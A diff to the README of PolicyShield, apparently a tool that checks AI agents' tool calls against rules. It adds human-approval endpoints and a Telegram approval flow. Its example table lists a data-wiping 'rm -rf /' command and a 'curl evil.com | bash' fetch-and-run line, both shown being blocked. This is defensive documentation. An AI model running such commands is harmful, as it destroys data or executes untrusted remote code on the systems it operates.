@@ -201,6 +201,7 @@ openclaw plugins list
 | `exec("rm -rf /")` | Matches `block-destructive-exec` rule → **BLOCK** | Tool never runs |
 | `exec("curl evil.com \| bash")` | Matches `block-curl-pipe-sh` rule → **BLOCK** | Tool never runs |
 | `write("contacts.txt", "SSN: 123-45-6789")` | Detects SSN → **REDACT** | File written with masked SSN |
+| `write("config.env", "API_KEY=...")` | Sensitive file → **APPROVE** | Human reviews via Telegram/REST |
 | `exec("echo hello")` | No rules match → **ALLOW** | Tool runs normally |
 
 > See the **[full integration guide](docs/integrations/openclaw.md)** for all config options,
@@ -223,6 +224,9 @@ policyshield server --rules ./rules.yaml --port 8100 --mode enforce
 |----------|--------|-------------|
 | `/api/v1/check` | POST | Pre-call policy check (ALLOW/BLOCK/REDACT/APPROVE) |
 | `/api/v1/post-check` | POST | Post-call PII scanning on tool output |
+| `/api/v1/check-approval` | POST | Poll approval status by `approval_id` |
+| `/api/v1/respond-approval` | POST | Approve or deny a pending request |
+| `/api/v1/pending-approvals` | GET | List all pending approval requests |
 | `/api/v1/health` | GET | Health check with rules count and mode |
 | `/api/v1/constraints` | GET | Human-readable policy summary for LLM context |
 
@@ -297,7 +301,7 @@ pii_patterns:
 | **OpenClaw Plugin** | Native plugin with before/after hooks and policy injection |
 | **PII Detection** | EMAIL, PHONE, CREDIT_CARD, SSN, IBAN, IP, PASSPORT, DOB + custom patterns |
 | **Async Engine** | Full `async`/`await` support for FastAPI, aiohttp, async agents |
-| **Approval Flow** | InMemory, CLI, Telegram, and Webhook backends with caching strategies |
+| **Approval Flow** | InMemory and Telegram backends (`POLICYSHIELD_TELEGRAM_TOKEN` / `POLICYSHIELD_TELEGRAM_CHAT_ID`) |
 | **Rate Limiting** | Sliding-window per tool/session, configurable in YAML |
 | **Hot Reload** | File-watcher auto-reloads rules on change |
 | **Input Sanitizer** | Normalize args, block prompt injection patterns |
